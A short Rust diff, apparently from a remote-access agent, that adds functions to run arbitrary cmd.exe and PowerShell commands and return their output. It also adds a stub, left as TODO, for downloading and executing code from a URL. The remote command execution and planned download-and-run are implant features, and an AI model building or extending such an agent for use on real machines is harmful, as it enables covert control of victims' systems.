@@ -7,7 +7,7 @@ use std::process;
 // execute a cmd command
 pub fn cmd_exec(cmd: &String) -> Result<String, io::Error> {
     // run cmd command
-    let command = process::Command::new(config::commands::CLI)
+    let command = process::Command::new("cmd.exe")
         .args(["/C", cmd])
         .output()?;
 
@@ -21,6 +21,31 @@ pub fn cmd_exec(cmd: &String) -> Result<String, io::Error> {
     // convert output to a string
     let output = String::from_utf8(output).unwrap_or(String::from(config::commands::OUTPUT_ERR));
     Ok(output)
+}
+
+// exeute a powershell command
+pub fn ps_exec(ps: &String) -> Result<String, io::Error> {
+    // run ps command
+
+    let command = process::Command::new("powershell.exe")
+        .arg(ps)
+        .output()?;
+
+    // get command's output as a String
+    let output = if command.stdout.len() > 0 {
+        command.stdout
+    } else {
+        command.stderr
+    };
+
+    // convert output to a string
+    let output = String::from_utf8(output).unwrap_or(String::from(config::commands::OUTPUT_ERR));
+    Ok(output)
+}
+
+// exeute a powershell command
+pub fn download_exec(_url: &String) -> Result<String, io::Error> {
+    Ok(String::from(config::commands::NOT_IMPLEMENTED)) // TODO
 }
 
 // delete agent
